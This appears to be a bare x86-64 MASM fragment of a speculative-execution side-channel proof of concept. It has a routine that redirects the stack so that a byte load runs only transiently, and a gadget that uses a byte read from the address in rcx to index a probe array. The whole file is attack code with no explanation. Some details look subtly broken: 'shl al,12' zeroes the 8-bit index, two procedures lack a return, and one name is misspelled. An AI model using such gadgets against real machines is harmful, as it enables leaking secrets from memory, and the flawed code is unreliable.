.code
trigger proc 
  mfence
  call f1
  movzx rax, byte ptr [rcx]
trigger endp

tigger_2 proc
  mfence
  movzx rax, byte ptr[rcx]
  shl al,12
  mov rax,[rdx + rax]
tigger_2 endp

f1 proc
  xorps xmm0, xmm0
  aesimc xmm0, xmm0
  aesimc xmm0, xmm0
  aesimc xmm0, xmm0
  aesimc xmm0, xmm0
  movd eax, xmm0
  lea rsp, [rsp+rax+8]
  ret
f1 endp
end
